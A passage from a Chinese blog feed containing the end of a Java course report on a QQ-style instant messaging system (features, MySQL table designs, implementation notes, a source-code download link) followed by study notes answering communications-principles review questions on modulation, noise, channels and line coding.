系统设计</h3><h4 id="2-1功能设计"><a href="#2-1功能设计" class="headerlink" title="2.1功能设计"></a>2.1功能设计</h4><p>系统功能框架如图2-1所示:</p><img src="D:\blog\shierjinghuang\source\_posts\Java实训\系统功能框架.jpg" style="zoom: 67%;" /><center>图2-1系统功能框架</center>系统使用流程如图2-1所示：<img src="D:\blog\shierjinghuang\source\_posts\Java实训\系统使用流程.jpg" alt="img" style="zoom:67%;" /><center>图2-2系统使用流程</center>即时通讯是一款基于互联网的即时通讯系统，系统分为两个部分服务端和客户端,实现基础的注册登录、好友管理、群组管理、即时通讯、日志记录、提供安全保障功能。<p>客户端为用户提供了注册登录功能，新用户通过注册账号进入即时通讯系统，系统自动展示好友列表窗体。用户根据需求通过用户账号、用户名的搜索实现好友添加，通过查看与设置好友信息实现对好友的备注、分类与管理；用户通过群号、群名的搜索想要加入的群聊，同时用户可以选取好友创建属于自己的群聊，根据需求修改群信息实现个性化群聊。</p><p>服务端实现了三大功能，界面显示功能、业务处理功能、数据传送功能。界面显示功能通过服务端的设置把控主窗体界面显示；业务处理功能管理对应的用户线程，顺利实现用户的注册、登录与退出，依托服务器连接数据库实现聊天业务的处理，完成信息的记录与查询；数据传送功能是即时聊天系统的核心功能，实现简单信息传输的同时，支持一定大小文件与图片的传输，同时为了增加交互的趣味性，支持表情包的传输，其余功能有待开发。</p><p><strong>2.1.1 登录界面</strong></p><ol><li><p>用户登录: 对输入用户名和密码进行验证。用户输入数据，发送到指定的客户端，由客户端与其相连的数据库进行比较</p></li><li><p>注册账号: 设置用户名、昵称、手机号、所在地、年龄、性别、密码并对信息进行存储</p></li></ol><p><strong>2.1.2 主界面</strong></p><ol><li><p>好友列表: 对好友分组实现创建、修改、删除；对好友实现修改备注、查看资料、清空聊天记录、置顶聊天等功能</p></li><li><p>群组列表: 对群组实现创建、解散、修改资料等功能</p></li><li><p>其他功能: 实现用户资料修改、查找/添加群和好友、查看群/好友申请列表/修改用户密码/退出登录等功能。</p></li></ol><p><strong>2.1.3聊天界面</strong></p><ul><li>实现消息发送、图片发送、表情发送、文件发送、截图、查看聊天记录、字体设置等功能。</li></ul><h4 id="2-2数据库设计"><a href="#2-2数据库设计" class="headerlink" title="2.2数据库设计"></a>2.2数据库设计</h4><p><strong>2.2.1 实体关系设计</strong></p><p>即时通讯系统采用的是MySQL数据库，然后借助数据库可视化软MySQL workbeach 创建数据库，通过相应建表语句，最后完整的设计出系统数据库。</p><p>系统数据库表基本E-R表关系如图2-2所示。</p><p>系统数据库实体属性如图2-3、图2-4、图2-5、图2-6所示。</p><img src="D:\blog\shierjinghuang\source\_posts\Java实训\数据库基本E-R图.jpg" style="zoom:80%;" /><center>图2-2系统E-R图</center><img src="D:\blog\shierjinghuang\source\_posts\Java实训\用户实体.jpg" style="zoom: 80%;" /><center>图2-3用户属性图</center><img src="D:\blog\shierjinghuang\source\_posts\Java实训\好友属性E-R图.jpg" style="zoom:80%;" /><center>图2-4好友属性图</center><img src="D:\blog\shierjinghuang\source\_posts\Java实训\消息属性E-R图.jpg" style="zoom:67%;" /><center>图2-5消息记录属性图</center><img src="D:\blog\shierjinghuang\source\_posts\Java实训\群属性E-R图.jpg" style="zoom:80%;" /><center>图2-6群属性图</center>**2.2.2表**<p>以下列出数据库设计过程中相关表的情况。</p><ol><li>yonghu用户信息表 :该表主要用于存储注册用户的个人账号信息，主要由账号密码、性别、年龄、昵称、电话、地址、注册日期等字段组成，其表结构如表2-1所示。</li></ol><center>表2-1 yonghu表的结构</center>|   字段名   | 数据类型 | 长度 | 是否主键 |   描述   || :--------: | :------: | ---- | :------: | :------: || yonghuming | varchar  | 200  |    是    |  用户名  ||    mima    | varchar  | 200  |    否    |   密码   ||  xingbie   | varchar  | 200  |    否    |   性别   ||  nianling  | varchar  | 200  |    否    |   年龄   ||   aihao    | varchar  | 200  |    否    |   爱好   ||    role    | varchar  | 200  |    否    |   角色   ||  nicheng   | varchar  | 200  |    否    |   昵称   ||   phone    | varchar  | 200  |    否    |   电话   ||  address   | varchar  | 200  |    否    |   地址   ||  headimg   | varchar  | 200  |    否    |   头像   || registdate | varchar  | 200  |    否    | 注册日期 |<ol start="2"><li>haoyou好友表 :该表主要用于存储用户的好友信息并记录是否置顶，好友信息主要由好友名、好友备注、昵称、归属组ID组成，其表结构主要如表2-2所示。</li></ol><center>表2-2 haoyou表的结构</center>| 字段名           | 数据类型 | 长度 | 是否主键 | 描述       || :--------------- | :------: | :--: | :------: | :--------- || id               | varchar  | 200  |    是    | 好友ID     || haoyouyonghuming | varchar  | 200  |    否    | 好友用户名 || beizhuname       | varchar  | 200  |    否    | 备注名称   || nickname         | varchar  | 200  |    否    | 昵称       || zhiding          | varchar  | 200  |    否    | 是否置顶   || fenleiid         |   int    |  10  |    否    | 归属组ID   |<ol start="3"><li>qun 群组表 :该表主要记录创建的群的群号、群名、群主、群备注以及群头像，其表结构主要如表2-3所示</li></ol><center>表2-3 qun表的结构</center>| 字段名  | 数据类型 | 长度 | 是否主键 |  描述  || :-----: | :------: | :--: | :------: | :----: || qunhao  | varchar  | 200  |    是    |  群号  || qunming | varchar  | 200  |    否    |  群名  || qunzhu  | varchar  | 200  |    否    |  群主  ||  note   | varchar  | 200  |    否    |  备注  || headimg | varchar  | 200  |    否    | 群头像 |<ol start="4"><li>qunyonghu 群用户表 :该表主要记录群用户ID、用户名，以及归属群的群号，其表结构主要如表2-4所示。</li></ol><center>表2-4 qunyonghu表的结构</center>| 字段名     | 数据类型 | 长度 | 是否主键 | 描述     || ---------- | -------- | ---- | -------- | -------- || id         | varchar  | 200  | 是       | 群用户ID || qunhao     | varchar  | 200  | 否       | 归属群号 || yonghuming | varchar  | 200  | 否       | 用户名   |<ol start="5"><li>xiaoxijilu 消息记录表 :该表主要是消息记录流，记录消息的发送方、接收方、类型、内容、大小，其表结构主要如表2-5所示</li></ol><center>表2-5 xiaoxijilu表的结构</center>| 字段名        | 数据类型 | 长度 | 是否主键 | 描述     || ------------- | -------- | ---- | -------- | -------- || id            | varchar  | 200  | 是       | 编号     || fasongren     | varchar  | 200  | 否       | 发送方   || jieshouren    | varchar  | 200  | 否       | 接收方   || neirong       | varchar  | 200  | 否       | 消息内容 || leixing       | varchar  | 200  | 否       | 消息类型 || fasongshijian | varchar  | 200  | 否       | 发送时间 || size          | varchar  | 200  | 否       | 消息大小 |<ol start="6"><li>fenlei :该表主要记录用户的所属分组，主要包括用户名、归属分组名、归属分组的ID，其表结构主要如表2-6所示</li></ol><center>表2-6 fenlei表的结构</center>| 字段名    | 数据类型 | 长度 | 是否主键 |   描述   || --------- | :------: | :--: | :------: | :------: || id        |   int    |  10  |    是    |    ID    || parentid  |   int    |  10  |    否    | 归属组ID || mingcheng | varchar  | 200  |    否    |   组名   || username  | varchar  | 200  |    否    |  用户名  |<ol start="7"><li>qiandao :该表用于记录用户的上线日期，其表结构主要如表2-7所示</li></ol><center>表2-7 qiandao表的结构</center>|   字段名    | 数据类型 | 长度 | 是否主键 |   描述   || :---------: | :------: | :--: | :------: | :------: ||     id      | varchar  | 200  |    是    |    ID    || qiandaoren  | varchar  | 200  |    否    |  用户名  || qiandaoriqi | varchar  | 200  |    否    | 上线日期 |<h3 id="3-系统实现"><a href="#3-系统实现" class="headerlink" title="3  系统实现"></a>3  系统实现</h3><h4 id="3-1登录界面"><a href="#3-1登录界面" class="headerlink" title="3.1登录界面"></a>3.1登录界面</h4><p><strong>3.1.1用户登录</strong></p><p>用户登录界面如图3-1所示。</p><img src="D:\blog\shierjinghuang\source\_posts\Java实训\用户登录界面.png"  /><center>图3-1用户登录界面图</center>页面由swing代码设计完成，通过swing的addMouseListener鼠标点击触发器，检测各功能的使用，当用户按下登录初始化一个消息对象，Message msg=new Message(textField.getText());并指定消息对象的类型为connect，并将消息发送给客户端，并开启线程监听服务器端发送信息。<p>在服务器端有Server.Task用于处理客户端发送的各种消息，当检查到消息类型为connect，进入登录审查，检查数据库签到表，如果表项不为空，说明当前账户已经在其他设备登录，返回该用户已登录信息，防之存储用户名对应的ip 端口，并查询数据库用户表项用户是否存在和密码是否正确。</p><p>如果账户密码匹配成功则返回信息，登录成功，反之返回登录失败，客户端会通过线程监听服务器返回的信息作出相应的反馈。</p><p><strong>3.1.2注册账号</strong></p><p>注册账号界面如图3-2所示。</p><img src="D:\blog\shierjinghuang\source\_posts\Java实训\账号注册页面.png" style="zoom:67%;" /><center>图3-2注册账号界面图</center>与登录流程类似，当用户点击注册按钮，会初始化一个消息对象，消息对象的类型字段为regist，并通过java.sql将数据存储到用户表上，此外与登录页面类似<p>另外的，在上传头像上使用java.io库中的getSelectedFile函数，在本地计算机中选取图像与头像，头像的传输与其在数据库的存储则是这一项目中较为困难的点，我们在用户表中设有headimg用于经过计算得到的存储32位的头像散列，并将其一流的形式发到对应服务器的headimg中，在用户登录时也是对应将这里的数据流发送给客户端</p><h4 id="3-2主界面"><a href="#3-2主界面" class="headerlink" title="3.2主界面"></a>3.2主界面</h4><p>即时通讯系统主界面如图3-3所示。</p><img src="D:\blog\shierjinghuang\source\_posts\Java实训\即时通讯系统主界面.png"  /><center>图3-3主界面</center>**3.2.1好友列表**<p>分组创建功能实现如图3-4所示，修改好友备注功能实现如图3-5所示。</p><img src="D:\blog\shierjinghuang\source\_posts\Java实训\创建图片.png" style="zoom:80%;" /><center>图3-4分组创建</center><img src="D:\blog\shierjinghuang\source\_posts\Java实训\修改备注.png"  /><center>图3-5修改备注</center>**3.2.2群组列表**<p>创建群功能实现如图3-6所示。</p><img src="D:\blog\shierjinghuang\source\_posts\Java实训\群聊功能实现.jpg"  /><center>图3-6群创建</center>**3.2.3其他功能**<p>添加好友功能实现如图3-7所示，添加群聊功能实现如图3-8所示，好友申请列表如图3-9所示</p><img src="D:\blog\shierjinghuang\source\_posts\Java实训\添加好友功能实现.png" style="zoom:80%;" /><center>图3-7添加好友</center><img src="D:\blog\shierjinghuang\source\_posts\Java实训\入群申请.png" style="zoom:80%;" /><center>图3-8申请入群</center><img src="D:\blog\shierjinghuang\source\_posts\Java实训\好友申请列表.png"  /><center>图3-9好友申请列表</center>#### 3.3聊天界面<p>私聊聊天界面如图3-10所示，群聊聊天界面如图3-11所示</p><img src="D:\blog\shierjinghuang\source\_posts\Java实训\私聊界面.png" style="zoom:80%;" /><center>图3-10 私聊聊天界面</center><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml9864\wps18.png" style="zoom: 80%;" /><center>图3-11 群聊聊天界面</center>本项目作为一个模仿QQ设计的即时通讯软件，私聊与群聊毫无疑问是程序的核心，在聊天的功能基础上我们受课程原始项目启发，实现了原有项目未能实现的字体设计，图片发送与文件发送，及表情包。表情包的本质实际为预先存储于程序文件夹下的图片与图片传输没有本质区别，在两个客户端均省去了，使用java.io库中程序寻找文件和，发送文件流的过程。<p>截图功能作为老师所提供项目本就实现的功能，在原有基础上没有做太大改动。文件传输与图片传输与用户注册或修改用户信息时头像的传输方式类似，都是同msg流实现文件在网络中传输，发送的数据会记录到数据库中，而接受放客户端在接受到想用信息后会将msg流存储与/msg文件夹下，实现了信息的本地存储。</p><h4 id="3-4数据存储实现"><a href="#3-4数据存储实现" class="headerlink" title="3.4数据存储实现"></a>3.4数据存储实现</h4><p>数据存储结果如图3-12</p><img src="D:\blog\shierjinghuang\source\_posts\Java实训\数据存储结果.jpg" style="zoom:80%;" /><center>图3-12 数据存储结果</center>**在数据库的实现过程中具体操作如下：**<ol><li><p>获取数据库连接：使用getConnection方法加载MySQL数据库驱动程序”jdbc:mysql://“+ip+”:3306/“+ dbname +”?characterEncoding=utf-8”, username, password,并通过getConnection()方法建立数据库连接</p></li><li><p>在代码中实现创建数据库和数据表，比如createStatement().execute()方法执行创建数据库命令及getConn() .createStatement().executeUpdate()方法实现数据表创建</p></li><li><p>对建立的数据库连接进行测试Connection对象的createStatement()方法创建Statement对象，使用Statement对象执行SQL语句，通过executeQuery()方法执行查询语句</p></li><li><p>创建对象，使用userService.save()实现将各种所需数据数据记录进数据表中</p></li></ol><h3 id="4-结论"><a href="#4-结论" class="headerlink" title="4  结论"></a>4  结论</h3><p>本项目是一个基于Java的企业QQ系统，实现了用户注册、登录、添加好友、聊天等基本功能。能够完成用户日常交流的需要。</p><p>通过本项目的实践，我们深入理解了Java语言和相关技术的应用，掌握了Swing、Java SQL、Java.util、MySQL、多线程等技术的使用，提高了自己的编码能力和项目开发经验。同时，本项目也为企业内部沟通和协作提供了一种新的方式，具有一定的实际应用价值。</p><h3 id="5-源代码"><a href="#5-源代码" class="headerlink" title="5 源代码"></a>5 源代码</h3><p>怎么说呢，在实训过程中找代码学习是非常麻烦的，这里我就直接放部分找到的材料源代码的百度网盘吧……</p><blockquote><p><font color=orange>链接：<a href="https://pan.baidu.com/s/1mk02u-x_Cp-ULR5G-zkLCA?pwd=pv7m">https://pan.baidu.com/s/1mk02u-x_Cp-ULR5G-zkLCA?pwd=pv7m</a> </font ><br><font color=orange>提取码：pv7m </font></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 网络工程相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>通信原理思考题</title>
      <link href="/2023/03/09/%E9%80%9A%E4%BF%A1%E5%8E%9F%E7%90%86%E6%80%9D%E8%80%83%E9%A2%98/"/>
      <url>/2023/03/09/%E9%80%9A%E4%BF%A1%E5%8E%9F%E7%90%86%E6%80%9D%E8%80%83%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h5 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a><strong>第一章</strong></h5><p>1-11衡量数字通信系统有效性和可靠性的性能指标有哪些?</p><blockquote><p>有效性用传输速率和频带利用率来衡量，可靠性用误码率、误信率来衡量</p></blockquote><p><font color="blue">1-12何谓是码元速率和信息速率?他们之间的关系如何?</font></p><blockquote><p>码元速率定义为单位时间里传输码元的个数，单位为波特(Baud)，信息速率定义为单位时间传输的比特数，单位是bit/s</p><p>码元速率在数值上小于等于信息速率。码元速率决定了发送信号所需的传输带宽。</p></blockquote><p>1-13何谓误码率和误信率?它们之间关系如何?</p><ul><li>误码率是指错误接收的码元数在传输总码元数中所占的比例  Pe=错误码元数/传输总码元数</li><li>误信率是指错误接收的比特数在传输总比特数中所占得比例  Pb=错误比特数/传输总比特数</li><li>它们是描述差错率的两种不同表述，在二进制中，二者数值相等</li></ul><h5 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a><strong>第二章</strong></h5><p>确知信号按照其强度可以分为能量信号和功率信号。功率信号按照其有无周期性划分，可以分为周期性信号和非周期性信号。</p><p>2-1何为确知信号?</p><blockquote><p>确知信号是指其取值在任何时间都是确定的和预知的信号</p></blockquote><p>2-2试分别说明能量信号和功率信号的特性?</p><blockquote><p>能量信号的其能量为有限的正值，但其功率等于零;功率信号其能量近似等于无穷大，其平均功率为有限值</p></blockquote><h5 id="第三章"><a href="#第三章" class="headerlink" title="第三章"></a><strong>第三章</strong></h5><p>随机过程的定义</p><p>定义一:<strong>随机过程是所有样本函数的集合</strong>，定义二:<strong>随机过程看作是在时间进程中处于不同时刻的随机变量的集合</strong></p><p>随机过程的统计特性由其分布函数或概率密度函数描述。</p><p>什么是各态历经性过程？</p><blockquote><p>随机过程中的任何一次实现都经历了随机过程的所有可能状态<font color="blue">（一个随机过程的所有样本函数都服从同一分布）</font></p></blockquote><ul><li>与平稳过程关系：具有各态历经性的过程一定是平稳随机过程，反之不一定成立</li></ul><p>3-1    何谓随机过程?它具有什么特点?</p><blockquote><p>随机过程是一类随时间随机变化的过程，他不能用确切的函数来表示。特点：1是对应不同随机试验结果的时间过程的集合，2是随机变量概念的延伸</p></blockquote><p>3-3    何谓严平稳?何谓广义平稳?他们之间的关系如何?</p><ul><li>严平稳:        若一个随机过程的统计特性与时间起点无关，时间平移不影响其任何统计特性</li><li>广义平稳:    均值与时间无关为常数，自相关函数只与时间间隔有关</li><li><font color="blue">关系:           若一个一般随机过程是严平稳随机过程，则它一定是广义平稳随机过程，反之不一定成立。若一个高斯过程，则严平稳随机过程与广义平稳随机过程等价。</font></li></ul><p>3-4    平稳过程的自相关函数有哪些性质?他与功率谱密度的关系如何?</p><pre class="line-numbers language-none"><code class="language-none">(1)平稳随机过程的自然相关函数与时间起点无关，只与时间间隔有关，而且是偶函数。(2) 平稳随机过程的功率谱密度与其自相关函数是一对傅里叶变换<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20221214235304920.png" alt="image-20221214235304920" style="zoom:50%;" /> </center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20221214235400829.png" alt="image-20221214235400829" style="zoom:50%;" /><p>3-5    什么是高斯过程，其主要性质有哪些?</p><blockquote><p>如果随机过程的任意的n维分布均服从正态分布，则称它为正态过程或高斯过程</p></blockquote><ol><li>高斯过程的n维分布只依赖于各个随机变量的均值，方差和归一化协方差;</li><li>广义平稳的高斯过程也是严平稳;</li><li>如果高斯过程在不同时刻的取值是不相关的，那么他们也是统计独立的;</li><li>高斯过程经过线性变换后仍然是高斯过程</li></ol><p>3-12    什么是白噪声?其频谱和自相关函数有什么特点?白噪声通过理想低通或理想带通滤波器后的情况如何?</p><pre class="line-numbers language-none"><code class="language-none">(1)噪声的功率谱密度在所有与频率上均为常数则称为白噪声;(2)频谱为一常数，自相关函数只在R(0)处为0 ;(3)通过理想低通或理想带通滤波器后分别变成低通白噪声或带通白噪声<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20221214235802823.png" alt="image-20221214235802823" style="zoom:50%;" /></center>3-13    何为高斯白噪声?它的概率密度函数、功率频谱密度如何表示?<blockquote><p>如果白噪声取值的概率密度分布服从高斯分布，则称之为高斯白噪声;其概率密度函数为高斯函数，其功率谱密度为常数</p></blockquote><p>3-13补充：什么是高斯噪声?它们各有什么特点?性质？P45</p><blockquote><p>高斯噪声:概率密度函数符合正态分布的噪声。</p></blockquote><blockquote><p>高斯噪声的特点:它的n维分布仅由各随机变量的数学期望、方差和两两之间的归一化协方差函数决定。若高斯噪声是宽平稳，则也是严平稳的。若随机变量之间互不相关，则也是统计独立的</p></blockquote><center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20221215000148202.png" alt="image-20221215000148202" style="zoom:50%;" /> <h5 id="第四章"><a href="#第四章" class="headerlink" title="第四章"></a><strong>第四章</strong></h5><p>按照传输媒质的不同分为：无线信道（自由空间或大气层）和有线信道（明线、电缆、光纤）</p><p>无线信道按照传播方式区分，包括地波、天波和视线传播三种。</p><p>有线信道分为有线电信道和有线光信道两大类</p><p>信道的数学模型分为调制信道模型和编码信道模型两类。</p><p>香农公式？<img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20221215000533207.png" alt="image-20221215000533207" style="zoom:50%;" /></p><p>4-6    何为多径效应?</p><blockquote><p>多径传播对信号的影响称为多径效应。多径传播指信号信号经过几条路径到达接收端，而且每条路径的长度（时延）和衰减都随着时间而变。</p></blockquote><p>4-8    何谓恒参信道，何谓随参信道，他们分别对信号传输有哪些主要影响?</p><pre class="line-numbers language-none"><code class="language-none">信道特性基本上不随时间变化或者变化很慢称为恒参信道;信道特性随机变化的信道称为随参信道;（乘性干扰随机变化的信道称为随参信道；乘性干扰基本保持恒定的信道称为恒参信道）恒参信道对信号传输的影响可以完全消除,而随参信道对信号传输的影响只能在统计平均的意义下消除<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>4-9    何谓加性干扰，何谓乘性干扰?</p><blockquote><p>信道中的噪声 n(t)是叠加在信号上的，而无论有无信号，噪声n(t)是始终存在的，该n(t)称加性干扰。<br>信道的作用相当于对输入信号乘一个系数k(t)，该k(t)可看作是对信号的一种干扰，k(t)称为乘性干扰。</p><blockquote><p>无论信号有无都存在的噪声称为加性干扰;随信号大小变化的干扰称为乘性千扰<del>(这个是原答案)</del></p></blockquote></blockquote><p>4-17    试述信道容量的定义?</p><blockquote><p>信道容量是指信道能够传输的最大平均信息量</p></blockquote><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20221215001532071.png" alt="image-20221215001532071" style="zoom:67%;" /> <h5 id="第五章"><a href="#第五章" class="headerlink" title="第五章"></a><strong>第五章</strong></h5><p>模拟调制分为：幅度调制和角度调制</p><ul><li><p>幅度调制包括：调幅AM、双边带DSB、单边带SSB、残留边带VSB调制</p><ul><li>所占带宽、特点、调制效率(功率利用率)</li><li>调幅AM特点：<img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20221215003003169.png" alt="image-20221215003003169" style="zoom: 33%;" /><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20221215003100632.png" alt="image-20221215003100632" style="zoom: 33%;" /></li><li>双边带DSB特点：<img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20221215003417004.png" alt="image-20221215003417004" style="zoom: 33%;" /></li><li>单边带SSB：<img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20221215003509942.png" alt="image-20221215003509942" style="zoom:33%;" /></li><li>残留边带VSB调制：<img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20221215003542088.png" alt="image-20221215003542088" style="zoom:33%;" /></li></ul><center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20221215003706914.png" alt="image-20221215003706914" style="zoom: 33%;" /> </center><center>P122页表格</center></li><li><p>角度调制分为：调频FM和调相PM</p></li></ul><p>线性调制的通用模型：滤波法和相移法</p><p>解调方法：相干解调和非相干解调</p><p>5-1    何为调制?调制在通信系统中的作用是什么?</p><pre class="line-numbers language-none"><code class="language-none">调制:把信号转换成适合在信道中传输的形式的一种过程（按调制信号的变化规律去控制载波的某个参数的过程，书上解释）作用:频谱搬移;实现信道的多路复用;扩展信号带宽,提高系统的抗干扰能力、抗衰落能力，还可实现传输带宽与信噪比之间的互换。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>5-2    什么是线性调制?常见的线性调制有哪些?</p><blockquote><p>正弦载波的幅度随调制信号做线性变化的过程。从频谱上说，已调信号的频谱结构与基带信号的频谱结构相同，只是频率位置发生变化。</p></blockquote><blockquote><p>常见的线性调制有调幅（AM)、双边带调制(DSB)、单边带调制(SSB)和残留边带调制(VSB)</p></blockquote><p>5-5    为什么要抑制载波?相对AM信号来说，抑制载波的双边带信号可以增加多少功效?</p><blockquote><p>抑制载波可以提高调制效率；对于抑制载波的双边带，可以使其调制效率由1/3提高到1</p></blockquote><p>5-9    DSB调制系统和SSB调制系统的抗噪声性能是否相同，为什么?</p><blockquote><p>相同，如果解调器的输入噪声功率密度相同，输入信号功率也相同，则单边带和双边带解调器输出的信噪比是相等的</p></blockquote><h5 id="第六章"><a href="#第六章" class="headerlink" title="第六章"></a><strong>第六章</strong></h5><p>6-4    构成AMI码和HDB3码的规则是什么?它们各有什么优缺点?</p><blockquote><p>AMI的编码规则:将消息代码0（空号）仍然变换成传输码0，而把1(传码）交替的变换为传输码的+1，-1…。因此AMI码为三电平序列，三元码，伪三进制，1B/1T码。</p></blockquote><ul><li>AMI的优点:0,1不等概率是也无直流；零频附近的低频分量小；整流后即RZ码；编译码电路简单而且便于观察误码情况</li><li>AMI的缺点是:连续0码多时，RZ码连0也多，不利于提取高质量的位同步信号</li></ul><blockquote><p>HDB3的编码规则:先把消息代码变换AMI码，然后去检查AMI码的连零情况，没有四个或者四个以上的连零串时,这时的AMI码就是HDB3码;当出现四个或者四个以上的连零串时，将四个连零小段的第四个0变换于迁移非0符号同极性的符号，称为v符号（破坏码)。当相邻V符号之间有偶数个非零符号时，再将该小段的第一个0变成+B或者-B（平衡码)，B符号的极性与前一非零符号的极性相反，并让后面的非О符号从V符号开始再交替变化。</p></blockquote><p>HDB3码的优点:保持了AMl的优点，还增加了使连零串减少到至多三个，对于定时信号的恢复是十分有利的。</p><p>6-6    什么是码间串扰?它是如何产生的?对通信质量有什么影响?</p><pre class="line-numbers language-none"><code class="language-none">(1)码间串扰:由于系统的总特性不理想，导致前后码元的波形畸变、展宽，并使前面的波形出现很长的拖尾，蔓延到当前码元的抽样时刻，从而对当前码元的判决造成干扰(2)码间干扰的产生是因为在第k个抽样时刻理想状态时抽样时刻所得的是仅有第k个波形在此时刻被取值，但在实际系统中，会有除了第k个波形以外的波形可能再抽样时刻被取值。码间干扰会导致判决电路对信号进行误判，使信号失真，产生误码，从而通信质量下降(3)码间干扰会导致判决电路对信号进行误判，使信号失真，产生误码，从而通信质量下降<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>6-7     为了消除码间串扰，基带传输系统的传输函数应满足什么条件?其相应的冲激响应应具有什么特点?</p><p>为消除码间串扰，基带传输系统的传输函数应满足:</p><img src="D:\gitee-blog\source\_posts\子域名深度挖掘\传输函数.png"  /><p>即满足无码间串扰频域条件。</p><p>其相应的冲激响应应具有：</p><img src="D:\gitee-blog\source\_posts\子域名深度挖掘\冲激响应.png"  /><p> 即具有无码间串扰时域条件。</p><p>6-8    何谓奈奎斯特速率和奈奎斯特带宽?此时的频带利用率有多大?</p><blockquote><p>理想低通传输特性的带宽称为奈奎斯特带宽,将该系统无码间干扰的最高传输速率称为奈奎斯特速率。此时频带利用率为2B/Hz</p></blockquote><p>6-13    什么是眼图?它有什么作用?由眼图模型可以说明基带传输系统的哪些性能?具有升余弦脉冲波形的HDB,码的眼图应是什么样的图形?</p><blockquote><p>眼图是实验手段估计基带传输系统性能的一种方法。它是指接收滤波器输出信号波形在示波器上叠加所形成的图像</p></blockquote><pre class="line-numbers language-none"><code class="language-none">眼图和系统性能的关系：1.最佳抽样时刻是“眼睛”张最大的时刻;2.对定时误差的灵敏度可由眼睛的斜率决定，斜率越陡，对定时误差就越灵敏;3.图中阴影区域的垂直高度表示信号畸变范围;4.图中央的横轴位置对应判决门限电平;5.在抽样时刻上，上下阴影区的间隔距离之半为噪声容限,即若噪声瞬时值超过这个容限，就可能发生错误判决眼图：一种宏观评价系统性能得一种手段；&#96;最佳抽样时刻：眼睛张开最大得时刻；定时误差灵敏度：眼眶的斜率，斜率越大越敏感；判决明显电平：横轴；噪声容限：纵轴；(1)最佳取样时刻应选择在眼睛张开最大的时刻;(2)眼睛闭合的速率，即眼图斜边的斜率，表示系统对定时误差灵敏的程度，斜边愈陡，对定位误差愈敏感;(3)在取样时刻上，阴影区的垂直宽度表示最大信号失真量;(4)在取样时刻上，上下两阴影区的间隔垂直距离之半是最小噪声容限，噪声瞬时值超过它就有可能发生错误判决;(5)阴影区与横轴相交的区间表示零点位置变动范围，它对于从信号平均零点位置提取定时信息的解调器有重要影响。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>具有升余弦脉冲波形的HDB,码的眼图中间会有一条代表0的水平线</p><h5 id="第七章"><a href="#第七章" class="headerlink" title="第七章"></a><strong>第七章</strong></h5><p>P205页信息</p><p>7-1    什么是数字调制?它和模拟调制有哪些异同点?</p><blockquote><p>数字调制是用载波信号的某些离散状态来表征传送的信息,在接收端对载波信号的离散调制参量进行检测。<br>和模拟调制一样数字调制也有调幅，调频和调相三种基本形式，并可以派生出多种其他形式。在原理上二者并没有什么区别。只不过模拟调制是对载波信号的参量进行离散调制，在接收端也只需对载波信号的离散调制参量估值</p></blockquote><p>7-2    数字调制的基本方式有哪些?其时间波形上各有什么特点?数字调制技术有两种方法:</p><blockquote><p>一是利用模拟调制方法去实现数字式调制，即把数字调制看成是模拟调制的一个特例，把数字基带信号当成模拟信号的特殊情况处理</p></blockquote><blockquote><p>二是利用数字信号的离散取值的特点通过开关键控载波，从而实现数字调制，这种调制方式通常有幅度键控、频率键控和相位键控。其时间波形上来说，有可能是不连续的</p></blockquote><p>7-5    什么是频移键控?2FSK信号产生和解调方法有哪些?</p><blockquote><p>频移键控是指用不同的载频来表示所传送的数字信息。<br>产生:1、利用矩形脉冲序列对一个载波进行调频产生;2、利用受矩形脉冲序列控制的开关电路对两个不同的频率进行选通，即键控法。<br>解调:通常采用非相干解调和相干解调两种方法，同时还有鉴频法，过零检测法和差分检波法</p></blockquote><p>7-6    2FSK信号相邻码元的相位是否连续变化与其产生方法有何关系?</p><blockquote><p>采用模拟调频电路实现的2FSK信号，其相位变化是连续的;采用数字键控法产生的2FSK信号其相位变化不一定连续</p></blockquote><p>7-8    什么是绝对移相?什么是相对移相?他们有何区别?绝对移相是用载波的相位直接表示码元;</p><blockquote><p>相对移相是用相邻码元的相对载波相位值表示数字信息。<br>相对移相信号可以看作是把数字信息序列绝对码变换成相对码,然后根据相对码进行绝对移相而成</p></blockquote><p>7-9    2PSK信号和2DPSK信号可以用哪些方法产生和解调?它们是否可以采用包络检波法解调?为什么?</p><blockquote><p>2PSK信号和2DPSK信号可以用模拟调制法和键控调制法产生;<br>2PSK信号可以用极性比较法，鉴相法解调，2DPSK信号通常用极性比较码变换法，差分相干法解调。<br>它们都不能采用包络检波法解调，因为它们是用相位而不是振幅来携带传送信息的</p></blockquote><p>7-10    